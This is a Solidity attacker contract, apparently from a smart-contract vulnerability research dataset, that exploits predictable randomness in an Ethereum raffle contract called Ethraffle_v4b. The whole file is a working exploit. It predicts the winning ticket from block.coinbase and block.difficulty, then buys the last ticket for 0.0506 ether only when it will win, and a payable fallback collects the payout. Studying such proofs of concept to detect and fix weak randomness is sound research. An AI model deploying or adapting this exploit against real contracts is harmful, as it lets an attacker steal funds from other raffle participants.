pragma solidity ^0.4.16;

import "../dataset/bad_randomness/etheraffle.sol";
contract Ethraffle_v4bAttacker {
    Ethraffle_v4b target;
    uint constant totalTickets = 50;
    mapping (uint => address) contestants;

    function Ethraffle_v4bAttacker(address _target) public {
        target = Ethraffle_v4b(_target);
    }

    function setContestant(uint number, address contestant) public {
        contestants[number] = contestant;
    }

    function setContestants(address contestant) public {
        for (uint i = 0; i < totalTickets - 1; i++) {
            contestants[i] = contestant;
        }
    }

    function chooseWinner() public returns (uint) {

        // console.log("coinbase", block.coinbase);
        // console.log("difficulty: %d", block.difficulty);

        address seed1 = contestants[uint(block.coinbase) % totalTickets];
        address seed2 = contestants[uint(address(this)) % totalTickets];
        uint seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);
        uint winningNumber = uint(randHash) % totalTickets;
        return winningNumber;
    }

    function attack() public payable returns (bool) {
        uint winningNumber = chooseWinner();
        if (winningNumber == totalTickets - 1) {
            target.buyTickets.value(0.0506 ether)();
            return true;
        }
        return false;
    }

    function() public payable {
    }
}